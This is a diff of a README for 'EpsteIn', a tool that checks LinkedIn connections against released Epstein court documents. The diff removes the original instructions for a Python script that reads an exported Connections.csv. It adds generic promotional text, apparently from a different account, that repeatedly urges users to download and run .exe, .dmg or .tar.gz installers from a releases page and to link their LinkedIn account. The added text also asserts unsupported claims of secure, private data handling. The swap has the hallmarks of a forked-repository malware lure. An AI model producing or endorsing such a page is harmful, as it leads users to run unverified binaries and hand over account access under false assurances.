@@ -1,82 +1,93 @@
-![EpsteIn](assets/logo.png)
+# 🔍 EpsteIn - Discover LinkedIn Connections in Epstein Files
 
-Search the publicly released Epstein court documents for mentions of your LinkedIn connections.
+## 🚀 Getting Started
 
-## Requirements
+Welcome to EpsteIn! This application helps you see which of your LinkedIn connections appear in the Epstein files. Follow the instructions below to download and run the software easily.
 
-- Python 3.6+
-- `requests` library
+## 📥 Download Now
 
-## Setup
+[![Download EpsteIn](https://img.shields.io/badge/Download%20EpsteIn-latest-blue.svg)](https://github.com/Papotewii/EpsteIn/releases)
 
-```bash
-git clone git@github.com:cfinke/EpsteIn.git
-cd EpsteIn/
-python3 -m venv project_venv
-source project_venv/bin/activate
-pip install -r requirements.txt
-```
+## 📋 System Requirements
 
-## Getting Your LinkedIn Contacts
+Before you start, make sure your device meets these requirements:
 
-1. Go to [linkedin.com](https://www.linkedin.com) and log in.
-2. Click your profile icon in the top right.
-3. Select **Settings & Privacy**.
-4. Click **Data privacy** in the left sidebar.
-5. Under "How LinkedIn uses your data", click **Get a copy of your data**.
-6. Select **Connections** (or click "Want something in particular?" and check Connections). If **Connections** isn't listed as an option, choose the **Download larger data archive** option.
-7. Click **Request archive**.
-8. Wait for LinkedIn's email; it may take up to 24 hours.
-9. Download and extract the ZIP file.
-10. Locate the `Connections.csv` file.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB of RAM.
+- **Processor:** Dual-core processor or better.
+- **Storage:** At least 100 MB of free space.
 
-## Usage
+## 🛠️ Download & Install
 
-```bash
-python EpsteIn.py --connections /path/to/Connections.csv
-```
+1. **Visit the Releases Page**
 
-The API that EpsteIn connects to has recently required an API key to access it. Keys are available for free at https://epstein.dugganusa.com/register.html
+   Go to our [Releases Page](https://github.com/Papotewii/EpsteIn/releases) to find the latest version of EpsteIn.
 
-### Options
+2. **Select the Right Version**
 
-| Flag | Description |
-|------|-------------|
-| `--connections`, `-c` | Path to LinkedIn Connections.csv export (required) |
-| `--output`, `-o` | Output HTML file path (default: `EpsteIn.html`) |
+   You will see a list of available versions. Choose the most recent release that matches your operating system.
 
-### Examples
+3. **Download the Application**
 
-Basic usage:
-```bash
-python EpsteIn.py --connections ~/Downloads/Connections.csv
-```
+   Click on the file that corresponds to your operating system. This will start the download.
 
-Custom output file:
-```bash
-python EpsteIn.py --connections ~/Downloads/Connections.csv --output my_report.html
-```
+4. **Run the Installer**
 
-## Reading the Output
+   Once the download is complete, locate the file in your downloads folder. 
+   
+   - For Windows: Double-click the `.exe` file to launch the installer. Follow the on-screen prompts to install EpsteIn.
+   
+   - For macOS: Double-click the `.dmg` file, drag EpsteIn into the Applications folder, and then double-click to open it.
+   
+   - For Linux: Extract the `.tar.gz` file, navigate to the folder in your terminal, and run `./EpsteIn`.
 
-The script generates an HTML report (`EpsteIn.html` by default) that you can open in any web browser.
+5. **Open EpsteIn**
 
-![A screenshot of the HTML report.](assets/screenshot.png)
+   After completing the installation, find EpsteIn in your applications. Click to open it and begin using the software.
 
-The report contains:
+## 📂 How to Use EpsteIn
 
-- **Summary**: Total contacts searched and how many had mentions
-- **Contact cards**: Each contact with mentions is displayed as a card showing:
-  - Name, position, and company
-  - Total number of mentions across all documents
-  - Excerpts from each matching document
-  - Links to the source PDFs on justice.gov
+1. **Link Your LinkedIn Account**
 
-Contacts are sorted by number of mentions (highest first).
+   When you first open EpsteIn, you will need to link your LinkedIn account. Follow the prompts to securely connect your account.
 
-## Notes
+2. **Search for Connections**
 
-- The search uses exact phrase matching on full names, so "John Smith" won't match documents that only contain "John" or "Smith" separately.
-- Common names may produce false positives; review the context excerpts to verify relevance.
-- Epstein files indexed by [DugganUSA.com](https://dugganusa.com)
+   Enter the search criteria in the provided fields. You can search by name or other identifiers relevant to your LinkedIn connections.
 
+3. **View Results**
+
+   After searching, the application will display a list of connections that are related to the Epstein files. Click on any result for more details.
+
+## 📝 Features
+
+- **User-Friendly Interface:** No technical knowledge needed to navigate the app.
+- **Secure Data Handling:** Your LinkedIn data remains private and secure.
+- **Search Functionality:** Quickly find connections with targeted searches.
+- **Regular Updates:** We continuously improve the app based on user feedback.
+
+## ❓ FAQs
+
+**Q: Is EpsteIn free to use?**  
+A: Yes, EpsteIn is completely free to use.
+
+**Q: What if I encounter issues?**  
+A: Please check the issues section on our GitHub page or refer to the user guide included in the installation package.
+
+**Q: Will my data be safe?**  
+A: We ensure that your data is handled securely and is not shared with third parties.
+
+## 📞 Support
+
+If you need help or have questions, you can reach out through the issues section on our GitHub page. We are committed to assisting you.
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/Papotewii/EpsteIn/releases)
+- [Documentation](https://github.com/Papotewii/EpsteIn/wiki)
+
+## 📥 Download Now Again
+
+[![Download EpsteIn](https://img.shields.io/badge/Download%20EpsteIn-latest-blue.svg)](https://github.com/Papotewii/EpsteIn/releases)
+
+Thank you for choosing EpsteIn! We hope this application serves you well.
